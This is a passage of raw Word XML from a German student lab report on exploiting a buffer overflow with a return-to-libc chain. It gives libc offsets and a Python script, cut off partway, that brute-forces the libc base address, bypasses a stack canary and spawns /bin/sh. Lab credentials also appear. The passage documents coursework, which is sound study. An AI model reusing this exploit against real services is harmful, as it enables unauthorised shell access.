            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[12]</w:t>
          </w:r>
          <w:r w:rsidR="00E67D32" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
    </w:p>
    <w:p w14:paraId="160F861E" w14:textId="11350EDC" w:rsidR="005A4E1B" w:rsidRPr="00B47CB9" w:rsidRDefault="005A4E1B" w:rsidP="00F53DDC">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B87C2D2" w14:textId="18B40AE4" w:rsidR="005A4E1B" w:rsidRPr="00B47CB9" w:rsidRDefault="00667354" w:rsidP="00F53DDC">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Anschließend suchte ic</w:t>
      </w:r>
      <w:r w:rsidR="00A500C4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">h nach einer </w:t>
      </w:r>
      <w:r w:rsidR="00F53DDC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="00A500C4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>öglichkeit, wie ich mir meine Ropchain zusammen bauen kann</w:t>
      </w:r>
      <w:r w:rsidR="00F53DDC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. Ich wurde mit </w:t>
      </w:r>
      <w:r w:rsidR="00DD2FD7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>einer detaillierten</w:t>
      </w:r>
      <w:r w:rsidR="00F53DDC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Anleitung fündig</w:t>
      </w:r>
      <w:r w:rsidR="00DD2FD7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:noProof/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#c9edb404-b9ae-44bb-9ea2-55a92d02ab9a"/>
          <w:id w:val="500938298"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00DD2FD7" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="00DD2FD7" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="002F4DA3">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[13]</w:t>
          </w:r>
          <w:r w:rsidR="00DD2FD7" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00DD2FD7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>. Diese beschreibt, wie die Base Ad</w:t>
      </w:r>
      <w:r w:rsidR="007D15F7" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dressen von den benötigten Funktionen herausgefunden werden kann. Wie bereits erwähn</w:t>
      </w:r>
      <w:r w:rsidR="00974779" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">t benötigt man dafür system, exit und /bin/sh. Die Base Adressen wurden wie in der Abbildung ersichtlich </w:t>
      </w:r>
      <w:r w:rsidR="00323562" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>bestimmt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BBA851" w14:textId="77777777" w:rsidR="005A4E1B" w:rsidRPr="00B47CB9" w:rsidRDefault="005A4E1B">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58C2BF04" w14:textId="6C98F9FF" w:rsidR="00257529" w:rsidRPr="00B47CB9" w:rsidRDefault="00257529">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7ECE5216" wp14:editId="16B6657A">
            <wp:extent cx="5759450" cy="2992120"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="103" name="Grafik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59450" cy="2992120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C550013" w14:textId="122C699D" w:rsidR="001076DB" w:rsidRPr="00B47CB9" w:rsidRDefault="001076DB" w:rsidP="00323562">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CDC6607" w14:textId="462F9790" w:rsidR="00323562" w:rsidRPr="00B47CB9" w:rsidRDefault="00DB098D" w:rsidP="00323562">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Daraus erg</w:t>
      </w:r>
      <w:r w:rsidR="00F24D70" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ab sich folgendes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0091BB2D" w14:textId="64B3CB75" w:rsidR="00DB098D" w:rsidRPr="00B47CB9" w:rsidRDefault="00DB098D" w:rsidP="00DB098D">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>system = libcBase + 0x3ab40</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C6676A" w14:textId="609135A6" w:rsidR="00DB098D" w:rsidRPr="00B47CB9" w:rsidRDefault="00DB098D" w:rsidP="00DB098D">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>exit = libcBase + 0x2e7f0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E4CCC9" w14:textId="3DC3FB98" w:rsidR="00323562" w:rsidRPr="00B47CB9" w:rsidRDefault="00DB098D" w:rsidP="00DB098D">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>binsh_string = libcBase + 0x15cdc8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676B6185" w14:textId="1D891E7C" w:rsidR="001076DB" w:rsidRPr="00B47CB9" w:rsidRDefault="001076DB" w:rsidP="00323562">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3063357E" w14:textId="30AFE16D" w:rsidR="001076DB" w:rsidRPr="00B47CB9" w:rsidRDefault="00ED0B8C" w:rsidP="00323562">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Mit diesem wissen konnte nun ein weiters Skript entwickelt werden, dass </w:t>
      </w:r>
      <w:r w:rsidR="001765B2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">die Base Adresse von Libc per Bruteforcing ermittelt. </w:t>
      </w:r>
      <w:r w:rsidR="00484187" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dazu musste ich zuerst herausfinden, in welchem Bereich die Base Adresse ungefähr liegen kann. </w:t>
      </w:r>
      <w:r w:rsidR="00AB2B7C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Ich habe die Anwendung in Gdb eingespielt und die Base Adresse</w:t>
      </w:r>
      <w:r w:rsidR="00C83C8B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">n ausgelesen (siehe Abbildung). Mir ist dabei aufgefallen, dass </w:t>
      </w:r>
      <w:r w:rsidR="00FD3DB4" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>sich Base Adresse von Libc beim Neustart der virtuellen Maschine nur geringfügig ändert. Stat</w:t>
      </w:r>
      <w:r w:rsidR="006508E1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>isch bleiben immer die ersten 2 Byte (B7) und die letzten 3 Byte (000).</w:t>
      </w:r>
      <w:r w:rsidR="001E62D2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Byte 3 – 5 muss also erraten werden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6667E850" w14:textId="77777777" w:rsidR="00D12A41" w:rsidRPr="00B47CB9" w:rsidRDefault="00D12A41" w:rsidP="00323562">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E9FE600" w14:textId="6E370092" w:rsidR="00A64BD1" w:rsidRPr="00B47CB9" w:rsidRDefault="00A64BD1" w:rsidP="00323562">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F1DCA63" wp14:editId="736F63A6">
            <wp:extent cx="4270076" cy="2365255"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="102" name="Grafik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280280" cy="2370907"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="709B79EA" w14:textId="2631EF58" w:rsidR="001076DB" w:rsidRPr="00B47CB9" w:rsidRDefault="001076DB" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5573E688" w14:textId="1941C142" w:rsidR="005177E0" w:rsidRPr="00B47CB9" w:rsidRDefault="00531210" w:rsidP="005177E0">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das entwickelte Skript ist </w:t>
      </w:r>
      <w:r w:rsidR="00946D2B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>in der folgenden Tabelle</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ersichtlich.</w:t>
      </w:r>
      <w:r w:rsidR="002E31CB" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Die Base Adresse von Libc wurde mit ‚0xB7000000’ festgelegt. </w:t>
      </w:r>
      <w:r w:rsidR="00352238" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Repsonse Variable wurde mit ‚false‘ initialisiert. Anschließend wird innerhalb einer Schleife der Wert dieser Variable überprüft. </w:t>
      </w:r>
      <w:r w:rsidR="0049310A" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Danach</w:t>
      </w:r>
      <w:r w:rsidR="00352238" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> wird die </w:t>
      </w:r>
      <w:r w:rsidR="004353F5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>bereits b</w:t>
      </w:r>
      <w:r w:rsidR="00352238" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>eschr</w:t>
      </w:r>
      <w:r w:rsidR="004353F5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">iebene Ropchain mit der Base Adresse berechnet. </w:t>
      </w:r>
      <w:r w:rsidR="00E96307" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nachdem der Buffer übertragen wurde wird ein ‚echo martingratt‘ an die Anwendung gesendet. Sollte der </w:t>
      </w:r>
      <w:r w:rsidR="00E9040C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">folgende </w:t>
      </w:r>
      <w:r w:rsidR="00E96307" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Response </w:t>
      </w:r>
      <w:r w:rsidR="00E9040C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">‚martingratt‘ beinhalten wird die </w:t>
      </w:r>
      <w:r w:rsidR="0087061B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r w:rsidR="00E9040C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">ariable </w:t>
      </w:r>
      <w:r w:rsidR="0087061B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">‚repsonse‘ auf true gesetzt. Sollte dies nicht der </w:t>
      </w:r>
      <w:r w:rsidR="005177E0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Fall</w:t>
      </w:r>
      <w:r w:rsidR="0087061B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> sein wird </w:t>
      </w:r>
      <w:r w:rsidR="005177E0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>libcBase um 0x00001000 er</w:t>
      </w:r>
      <w:r w:rsidR="00932E16" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>höht und der Vorgang beginnt von vorne.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="403401B2" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="00B47CB9" w:rsidRDefault="00116B42" w:rsidP="001E62D2">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00116B42" w:rsidRPr="00866A18" w14:paraId="0FB5D18A" w14:textId="77777777" w:rsidTr="00116B42">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4ED1EC5B" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import struct</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6665482E" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="568F06D8" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import time</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48066928" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="38FCF175" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>canaries = '\xBC\xAD\xB8\xA8'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AC7EBBF" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>fillerNopSleds = '\x90' * 20</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42ABDAD9" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>login = 'cs19m050:cs19m050' + '\n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55F79637" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>libcBase = int("0xB7000000", 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="164A9E97" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>response = 'false'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47B2BBD4" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>while response == 'false':</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EDC9DF7" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print "------------------------"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60A4E06C" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    print "Bruteforcing application with the following libc base address: " + hex(libcBase)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30428B51" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="00B47CB9" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>print "------------------------"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03E7747A" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="00B47CB9" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    system = libcBase + 0x3ab40</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="616C1BD3" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="00B47CB9" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    exit = libcBase + 0x2e7f0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B744DA4" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>binsh = libcBase + 0x15cdc8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07D333D8" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="4C789FD6" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    r2libc = struct.pack('&lt;L', system)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A98C1B0" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    r2libc += struct.pack('&lt;L', exit)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="614B5AD2" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    r2libc += struct.pack('&lt;L', binsh)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22E81AFC" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3D5FF037" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="008E2D33">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = "A" * 128 + canaries + fillerNopSleds + r2libc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="248F5070" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="290DA617" w14:textId="77777777" w:rsidR="00116B42" w:rsidRPr="008E2D33" w:rsidRDefault="00116B42" w:rsidP="00116B42">
